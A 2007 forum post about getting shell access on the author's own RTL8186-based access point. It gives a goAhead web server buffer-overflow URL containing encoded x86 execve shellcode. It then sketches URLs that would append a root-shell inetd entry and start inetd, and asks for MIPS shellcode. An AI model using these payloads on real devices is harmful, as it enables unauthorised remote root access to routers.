					<p>In order to play around and use an RTL8186 based AP, I need to get initial shell access; <br />Now that particular device does not provide Telnet/SSH out of the box. So I need something to<br />bring up the telnetd. Although there might be an UART available, I&#039;d like to get around without<br />installing a serial interface. So here&#039;s the task: </p><p>As said, that device is running linux on an RTL8186 SoC. The webserver in use is from goAhead.<br />Searching the web, I found a buffer overflow exploit when passing a very long URL to the implemented <br />webserver. What I need now is a MIPS compatible shellcode which I can pass along using a normal<br />web browser. Since it is some sort of a sample of a brand new device, I was asked not to publish<br />the manufacturer and model of this device yet. However, this hack should be applicable to many <br />other devices which use the goAhead webserver for the admin frontend.</p><p>The webserver can be exploited on an x86 System with this URL:</p><p><a href="http://192.168.1.1/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x">http://192.168.1.1/x/x/x/x/x/x/x/x/x/x/ … /x/x/x/x/x</a><br />/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/<br />x/x/x/x/x/x/x/x/x/%eb%1f%5e%89%76%08%31%c0%88%46%07%89<br />%46%0c%b0%0b%89%f3%8d%4e%08%8d%56%0c%cd%80%31%db%89%d8%40%cd%80%e8%dc%ff%ff%ffreboot </p><br /><p>So&nbsp; in order to bring up a telnetd I was thinking of something like this: </p><p>http://IP/x/x/.../x/[MIPS_shellcode]/bin/echo%20\&quot;23%20stream%20tcp%20nowait%20root%20/bin/sh%20-i\&quot;%20&gt;&gt;%20/tmp/inet</p><p>and then just start telnetd with </p><p>http://IP/x/x/.../[MIPS_shellcode]/usr/sbin/inetd%20/tmp/inet</p><p>where MIPS_shellcode is the MIPS equivalent to the above x86 sample code</p><p>Is there anybody around who might be so kind and compile me a comparable shellcode for this Realtek MIPS CPU?!<br />Basically this should be a big help for many routers/aps which do not provide telnet out of the box...</p><p>Any help is highly appreciated!</p><br /><p>You can find further details about shellcode here:</p><p><a href="http://ebook.security-portal.cz/book/advanced_overflows/p56-0x0f.txt">http://ebook.security-portal.cz/book/ad … 6-0x0f.txt</a></p><p><a href="http://seclists.org/bugtraq/1997/May/0197.html">http://seclists.org/bugtraq/1997/May/0197.html</a></p><p><a href="http://dione.cc/~kil3r/sploits/mipsel_shellcode.c">http://dione.cc/~kil3r/sploits/mipsel_shellcode.c</a></p><p><a href="http://vankoll.de/sec/bo1.html">http://vankoll.de/sec/bo1.html</a> (in german)</p>											<p class="post-edited">(Last edited by <strong>hegnenberg</strong> on 29 Nov 2007, 03:38)</p>
